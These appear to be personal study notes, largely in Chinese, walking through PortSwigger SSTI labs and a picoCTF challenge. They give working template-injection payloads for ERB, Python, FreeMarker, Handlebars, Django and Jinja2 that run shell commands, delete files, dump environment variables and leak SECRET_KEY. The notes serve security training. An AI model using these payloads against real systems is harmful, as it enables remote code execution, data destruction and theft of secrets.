# Server-Side Template Injection

https://portswigger.net/web-security/server-side-template-injection/exploiting

對 Twig, FreeMarker 等框架做 injection

## 機制
```php
$output = $twig->render($_GET['custom_email'],  array("first_name" => $user.first_name) );
```
注入
```
custom_email={{7*7}}

49
```
### 步驟
1. 檢查 SSTI: 注入 `{{5*2}}` 看會不會回傳 `10`
  - Fuzz: `${{<%[%'"}}%\` 把這個砸下去看看會不會噴錯
2. 檢查框架
  - {{7*'7'}} would result in 49 in Twig --> php
  - {{7*'7'}} would result in 7777777 in Jinja2 --> python
3. 找框架的 security section，可能會寫不可以...，可以把這個文件當 cheat sheet 用

## Demo
### Lab1
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic <br>
測試一下，可以發現 message 可以被注入 <br>
https://0a3a00f00382d99e807bad12007a00d0.web-security-academy.net/?message=%3C%=7*7%%3E <br>
> 49

之後就開找檔案 <br>
https://0a3a00f00382d99e807bad12007a00d0.web-security-academy.net/?message=%3C%=%20system(%22ls%22)%20%%3E <br>
> morale.txt true

之後達成條件：刪除 morale.txt <br>
https://0a3a00f00382d99e807bad12007a00d0.web-security-academy.net/?message=%3C%=%20File.delete("morale.txt")%20%%3E <br>
> Lab success

### Lab2
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context<br>
記得用 lab 需求的帳密登入，一開始沒看到戳超久QQ <br>
進入後，可以發現 Preferred name 送出封包為 user.name()，看起來有 SSTI，於是就簡單測了一下
```
blog-post-author-display=7*7&csrf=hQtKf7CiArqjjjwZVcj6BNQoOxPXPEfm
```
>![](webSSTILab2Recc.png)
> 7*7 -> 49

```
blog-post-author-display='7'*7&csrf=hQtKf7CiArqjjjwZVcj6BNQoOxPXPEfm


blog-post-author-display='7*7&csrf=hQtKf7CiArqjjjwZVcj6BNQoOxPXPEfm
```
>![](webSSTILab2Recc2.png)
>![](webSSTILab2Recc3.png)
>可以發現是 python 後端

之後嘗試用
```
blog-post-author-display=dir(__builtins__)&csrf=hQtKf7CiArqjjjwZVcj6BNQoOxPXPEfm
```
> ![](webSSTILab2FindPacketage.png)


單純使用 system('ls') 會遇到 os not defind，所以要加上 `__import__('os')`
```
blog-post-author-display=__import__('os').system('ls')&csrf=2N6vi7b7I2kOpVuWutfwq1WwPMhusd6U
```

```
blog-post-author-display=__import__('os').system('rm morale.txt')&csrf=2N6vi7b7I2kOpVuWutfwq1WwPMhusd6U
```

### Lab3
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation <br>

發現 edit 功能輸入 `${7*7}` 可以成功變成 49，injection 成功<br>
injection 成功後，就開始想辦法找框架，嘗試輸入 `version` 發現有成功噴出 exception

>FreeMarker template error (DEBUG mode; use RETHROW in production!): The following has evaluated to null or missing: ==> version [in template "freemarker" at line 10, column 18] ---- Tip: If the failing expression is known to legally refer to something that's sometimes null or missing, either specify a default value like myOptionalVar!myDefault, or use <#if myOptionalVar??>when-present<#else>when-missing</#if>. (These only cover the last step of the expression; to cover the whole expression, use parenthesis: (myOptionalVar.foo)!myDefault, (myOptionalVar.foo)?? ---- ---- FTL stack trace ("~" means nesting-related): - Failed at: ${version} [in template "freemarker" at line 10, column 16] ---- Java stack trace (for programmers): ---- freemarker.core.InvalidReferenceException: [... Exception message was already printed; see it above ...] at freemarker.core.InvalidReferenceException.getInstance(InvalidReferenceException.java:134) at freemarker.core.EvalUtil.coerceModelToTextualCommon(EvalUtil.java:479) at freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:401) at freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:370) at freemarker.core.DollarVariable.calculateInterpolatedStringOrMarkup(DollarVariable.java:100) at freemarker.core.DollarVariable.accept(DollarVariable.java:63) at freemarker.core.Environment.visit(Environment.java:331) at freemarker.core.Environment.visit(Environment.java:337) at freemarker.core.Environment.process(Environment.java:310) at freemarker.template.Template.process(Template.java:383) at lab.actions.templateengines.FreeMarker.processInput(FreeMarker.java:58) at lab.actions.templateengines.FreeMarker.act(FreeMarker.java:42) at lab.actions.common.Action.act(Action.java:57) at lab.actions.common.Action.run(Action.java:39) at lab.actions.templateengines.FreeMarker.main(FreeMarker.java:23)

框架：FreeMarker
接著去看框架的 manual，並且找看看 security section 有沒有什麼特別的說明，這些說明高機率會有 exploit 的範例，可以當作 cheat list 用

從 [FAQ](https://freemarker.apache.org/docs/app_faq.html#faq_template_uploading_security) 可以發現模板可以透過 "類別名稱"?new() 建立 Java 物件。

https://freemarker.apache.org/docs/ref_builtins_expert.html#ref_builtin_new <br>
https://freemarker.apache.org/docs/pgui_datamodel_method.html#pgui_datamodel_method<br>

進一步去看 new 的功能後，發現它可以創建 TemplateModel，因此再進一步去看 TemplateModel 的說明，發現有 execute 這個 model 可以用

https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html


payload
```
${"freemarker.template.utility.Execute"?new()("ls")}
${"freemarker.template.utility.Execute"?new()("rm morale.txt")}
```

### Lab4
透過 error msg 可以知道 template 是 handlebarsjs

handlebars 的檢查比較嚴格，他不會直接執行單行指令，像是 `7*7` 會報錯<br>
透過 lookup 找 Dangerous Helpers 像是 `Function` constructor
```
?message={{lookup this "constructor"}}
```
> function Object() { [native code] }

```
{{lookup (lookup this "constructor") "constructor"}}
```
> function Function() { [native code] }

this.constructor -> object
object.constructor -> Function

因此我們就找到了一個創 function 的方法，以下可以創造一個會回傳 7*7 的 function

```
{{lookup (lookup this "constructor") "constructor" ("7*7")}}
```

但直接 call 他會失敗
```
{{lookup (lookup this "constructor") "constructor" ("7*7")()}}
```
> The parser sees the () after the string and throws a Parse error. Handlebars only supports:
> - {{expression}} → property access or helper calls
> - {{helper arg1 arg2}} → calling registered helpers
> - {{#with … as |x|}} or {{#each …}} → block helpers
> 
> You cannot use JS-style parentheses to immediately call a function inside {{…}}.

改成用 with 看看
```
{{#with lookup (lookup this "constructor") "constructor" ("7*7") as |F|}}
  {{F}}
{{/with}}
```
> 失敗...internal error


於是上網找 exploit，搜尋 handlebarsjs server side template injection，可以找到一個 spotify 的 bug bounty，最後也有作者寫的文章

https://hackerone.com/reports/423541
https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html

然後就把作者的 code 拿去 inject
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return JSON.stringify(process.env);"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
直接丟發現會 internal error，於是用 urlencode 繞過試試，之後發現成功繞過了

> e 2 [object Object] function Function() { [native code] } 2 [object Object] {&quot;NODE_PATH&quot;:&quot;/opt/node-v19.8.1-linux-x64/lib/node_modules/&quot;,&quot;PATH&quot;:&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin&quot;,&quot;LOGNAME&quot;:&quot;carlos&quot;,&quot;USER&quot;:&quot;carlos&quot;,&quot;HOME&quot;:&quot;/home/carlos&quot;,&quot;SHELL&quot;:&quot;/bin/bash&quot;,&quot;TERM&quot;:&quot;unknown&quot;,&quot;SUDO_COMMAND&quot;:&quot;/opt/node-v19.8.1-linux-x64/lib/node_modules/../../bin/node -e var handlebars &#x3D; require(&#x27;handlebars&#x27;)\nvar source &#x3D; require(&#x27;fs&#x27;).readFileSync(process.stdin.fd, &#x27;utf-8&#x27;)\nvar template &#x3D; handlebars.compile(source)\nvar data &#x3D; {}\nconsole.log(template(data))&quot;,&quot;SUDO_USER&quot;:&quot;academy&quot;,&quot;SUDO_UID&quot;:&quot;10000&quot;,&quot;SUDO_GID&quot;:&quot;10000&quot;}


底下也有寫到把 `{{this.push "return JSON.stringify(process.env);"}}` 換成 `{{this.push "return require('child_process').execSync('ls -la');"}}` 就可以拿到 shell
result:

> e 2 [object Object] function Function() { [native code] } 2 [object Object] total 16 drwxr-xr-x 1 carlos carlos 27 Aug 14 17:07 . drwxr-xr-x 1 root root 20 Jul 6 01:11 .. -rw-rw-r-- 1 carlos carlos 132 Aug 14 16:33 .bash_history -rw-r--r-- 1 carlos carlos 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 carlos carlos 3771 Feb 25 2020 .bashrc -rw-r--r-- 1 carlos carlos 807 Feb 25 2020 .profile

最後把指令換成刪除就可以完成 lab 了


### Lab5
透過報錯訊息可以知道框架式 django，閱讀 document 後發現有 debug tag

payload
```
 {% debug %}
```

透過 debug 模式，我們可以看到我們可以 access `settings`，進一步去看[設定文件](https://github.com/django/django/blob/main/django/conf/global_settings.py)，可以知道我們想要的東西的變數名稱為 `SECRET_KEY`

```
{{settings.SECRET_KEY}}
```

### picoCTF SSTI1
payload
```twig
{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}
```

result
```
.: __pycache__ app.py flag requirements.txt ./__pycache__: app.cpython-38.pyc
```
payload
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

